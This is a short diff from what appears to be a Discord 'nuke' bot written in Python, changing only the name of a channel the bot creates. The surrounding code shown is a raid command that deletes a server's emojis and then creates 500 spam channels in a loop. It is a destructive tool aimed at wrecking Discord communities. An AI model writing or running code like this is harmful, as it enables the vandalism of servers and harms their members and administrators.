@@ -75,7 +75,7 @@ async def sad(ctx): #~ start command / nuke
        print(Fore.GREEN + f"{emoji.name}[V] Was deleted succesfull.")
      except:
        print(Fore.RED + f"{emoji.name}[!] Has not been Deleted! (missing perms?)")
-    await guild.create_text_channel("github is bvllet")
+    await guild.create_text_channel("github is gotripped")
     amount = 500
     for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
